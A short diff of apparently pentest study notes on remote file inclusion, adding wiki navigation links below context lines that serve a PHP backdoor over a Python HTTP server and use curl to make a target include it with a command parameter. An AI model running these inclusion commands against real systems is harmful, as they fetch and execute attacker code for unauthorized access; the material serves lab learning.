@@ -131,3 +131,14 @@ python3 -m http.server 80
 curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
 
 └─$ curl "http://192.168.158.16/meteor/index.php?page=http://192.168.45.220/simple-backdoor.php&cmd=ls"
+
+---
+%% graph-links %%
+## Related
+- [[Local file inclusion (LFI)]]
+- [[PHP wrappers]]
+- [[Using executable files]]
+
+> [!info] Navigation
+> Section: [[Web Applications/Common Web Application Attacks/File Inclusion Vulnerabilities/_index|File Inclusion Vulnerabilities]] · Home: [[🏠 Home]]
+
